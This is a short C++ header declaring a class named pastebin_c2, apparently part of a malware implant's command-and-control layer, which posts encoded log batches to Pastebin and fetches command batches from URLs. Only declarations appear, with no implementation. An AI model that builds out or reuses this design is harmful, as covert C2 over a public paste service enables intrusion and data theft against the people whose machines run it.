#ifndef PASTEBIN_H
#define PASTEBIN_H

#include "comm.h"
#include "crypto.h"
#include "protocol.h"
#include <string>
#include <vector>

class pastebin_c2 {
public:
    pastebin_c2(Comm* comm_module, crypto_encoder* encoder);
    
    // Posts a log batch to Pastebin
    std::string post_logs(const LogBatch& logs);

    // Fetches and parses a command batch from a URL
    CommandBatch fetch_commands(const std::wstring& url);

    // Syncs time from the server headers
    void sync_time();

private:
    Comm* comm_module;
    crypto_encoder* encoder;
    uint64_t last_synced_time;
};

#endif // PASTEBIN_H
